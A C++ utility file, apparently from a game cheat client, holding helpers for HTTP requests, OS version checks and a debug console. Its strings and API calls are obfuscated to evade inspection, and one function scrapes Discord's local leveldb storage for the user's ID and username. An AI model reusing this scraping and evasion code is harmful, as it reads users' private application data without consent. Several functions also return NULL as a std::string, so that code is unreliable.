#include "Misc.hpp"

#include <algorithm>
#include <winhttp.h>
#include <sstream>
#include <tchar.h>
#include <regex>
#include <fstream>
#include <shlobj.h>

namespace FrameWork
{
	int Misc::RandomInt(int Lower, int Max)
	{
		return (rand() % (Max - Lower + 1)) + Lower;
	}

	std::string Misc::Wstring2String(std::wstring Input)
	{
		return std::string(Input.begin(), Input.end());
	}


	std::wstring Misc::String2WString(std::string Input)
	{
		return std::wstring(Input.begin(), Input.end());
	}

	void Misc::InitializeConsole()
	{
		SafeCall(AllocConsole)();
		freopen(XorStr("CONIN$"), XorStr("r"), stdin);
		freopen(XorStr("CONOUT$"), XorStr("w"), stdout);
		SafeCall(SetConsoleTitleA)(XorStr("Debug Console"));
	}

	std::string Misc::GetDiscordUsername()
	{
		char appDataPath[MAX_PATH];
		std::string discordUsername;

		if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appDataPath)))
		{
			std::vector<std::string> possibleFolders = {
				XorStr("\\discord\\Local Storage\\leveldb\\"),
			};

			for (const auto& subFolder : possibleFolders)
			{
				std::string discordPath = std::string(appDataPath) + subFolder;
				std::string pattern = discordPath + "*.ldb";

				WIN32_FIND_DATAA findData;
				HANDLE hFind = FindFirstFileA(pattern.c_str(), &findData);

				if (hFind == INVALID_HANDLE_VALUE)
					continue;

				do {
					std::string filePath = discordPath + findData.cFileName;
					std::ifstream file(filePath, std::ios::binary);
					if (!file.good())
						continue;

					std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
					file.close();

					std::vector<std::string> possibleDomains = {
						XorStr("discord.com"),
						XorStr("discordapp.com"),
					};

					bool found = false;
					std::string discordId;

					for (auto& domain : possibleDomains)
					{
						size_t pos = 0;
						while ((pos = content.find(domain, pos)) != std::string::npos)
						{
							const int scanAhead = 100;
							size_t endPos = (std::min)(pos + domain.size() + scanAhead, content.size());
							std::string chunk = content.substr(pos, endPos - pos);

							std::regex re("\\b(\\d{17,19})\\b");
							std::smatch match;
							if (std::regex_search(chunk, match, re))
							{
								discordId = match.str(1);
								found = true;
								break;
							}
							pos += domain.size();
						}
						if (found) break;
					}

					if (!discordId.empty())
					{
						std::regex userIDre("\"user_id\"\\s*:\\s*\"(\\d{17,19})\"");
						std::regex usernameRe("\"username\"\\s*:\\s*\"([^\"]+)\"");

						std::smatch userIDMatch, usernameMatch;
						if (std::regex_search(content, userIDMatch, userIDre)) {
						}
						if (std::regex_search(content, usernameMatch, usernameRe)) {
							discordUsername = usernameMatch.str(1);
						}
					}

					if (!discordUsername.empty())
						break;

				} while (FindNextFileA(hFind, &findData));

				FindClose(hFind);

				if (!discordUsername.empty())
					break;
			}
		}
		return discordUsername;
	}


	void Misc::ShutDownConsole()
	{
		SafeCall(FreeConsole)();
	}

	std::string Misc::DownloadServerInfo(std::wstring IP, int PORT)
	{
		return HttpRequest(IP, PORT, L"/players.json", "GET", "", false);
	}

	std::string Misc::HttpRequest(const std::wstring& host, int port, const std::wstring& path, const std::string& method, const std::string& body, bool secure)
	{
		std::string Response;
		HINTERNET hSession = WinHttpOpen(XorStr(L"ScarfaceX-External/1.0"), WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);

		if (hSession)
		{
			HINTERNET hConnect = WinHttpConnect(hSession, host.c_str(), (INTERNET_PORT)port, 0);

			if (hConnect)
			{
				DWORD flags = secure ? WINHTTP_FLAG_SECURE : 0;
				std::wstring wMethod = String2WString(method);
				HINTERNET hRequest = WinHttpOpenRequest(hConnect, wMethod.c_str(), path.c_str(), NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, flags);

				if (hRequest)
				{
					// Add Content-Type header if body is present
					if (!body.empty())
					{
						std::wstring headers = L"Content-Type: application/json\r\n";
						WinHttpAddRequestHeaders(hRequest, headers.c_str(), (ULONG)-1L, WINHTTP_ADDREQ_FLAG_ADD);
					}

					if (WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, (LPVOID)body.c_str(), (DWORD)body.length(), (DWORD)body.length(), 0))
					{
						if (WinHttpReceiveResponse(hRequest, NULL))
						{
							DWORD dwSize = 0;
							DWORD dwDownloaded = 0;
							LPSTR pszOutBuffer;

							do
							{
								dwSize = 0;
								if (WinHttpQueryDataAvailable(hRequest, &dwSize) && dwSize > 0)
								{
									pszOutBuffer = new char[dwSize + 1];
									if (pszOutBuffer)
									{
										ZeroMemory(pszOutBuffer, dwSize + 1);
										if (WinHttpReadData(hRequest, (LPVOID)pszOutBuffer, dwSize, &dwDownloaded))
											Response.append(pszOutBuffer, dwDownloaded);
										delete[] pszOutBuffer;
									}
								}
							} while (dwSize > 0);
						}
					}
					WinHttpCloseHandle(hRequest);
				}
				WinHttpCloseHandle(hConnect);
			}
			WinHttpCloseHandle(hSession);
		}
		return Response;
	}

	RTL_OSVERSIONINFOW Misc::GetRealOSVersion()
	{
		HMODULE hMod = SafeCall(GetModuleHandleW)(XorStr(L"ntdll.dll"));
		if (hMod)
		{
			RtlGetVersionPtr fxPtr = (RtlGetVersionPtr)SafeCall(GetProcAddress)(hMod, XorStr("RtlGetVersion"));
			if (fxPtr != nullptr)
			{
				RTL_OSVERSIONINFOW rovi = { 0 };
				rovi.dwOSVersionInfoSize = sizeof(rovi);
				if (fxPtr(&rovi) == 0x00000000)
				{
					return rovi;
				}
			}
		}
		RTL_OSVERSIONINFOW rovi = { 0 };
		return rovi;
	}

	std::string Misc::GetWindowsFullBuildNumber()
	{
		DWORD Dummy;
		DWORD VersionSize = SafeCall(GetFileVersionInfoSizeA)(XorStr("kernel32.dll"), &Dummy);
		if (VersionSize == 0)
			return NULL;

		std::unique_ptr<BYTE[]> pBuffer(new BYTE[VersionSize]);
		if (!SafeCall(GetFileVersionInfoA)(XorStr("kernel32.dll"), 0, VersionSize, pBuffer.get()))
			return NULL;

		VS_FIXEDFILEINFO* pFileInfo;
		UINT VersionLength;
		if (!SafeCall(VerQueryValueA)(pBuffer.get(), XorStr("\\"), reinterpret_cast<void**>(&pFileInfo), &VersionLength))
			return NULL;

		std::stringstream aa;

		aa << HIWORD(pFileInfo->dwProductVersionMS) << XorStr(".") << LOWORD(pFileInfo->dwProductVersionMS) << XorStr(".") << HIWORD(pFileInfo->dwProductVersionLS) << XorStr(".") << LOWORD(pFileInfo->dwProductVersionLS);

		return aa.str();
	}

	ImColor Misc::Float4ToImColor(float* Input)
	{
		return ImColor(Input[0], Input[1], Input[2], Input[3]);
	}
}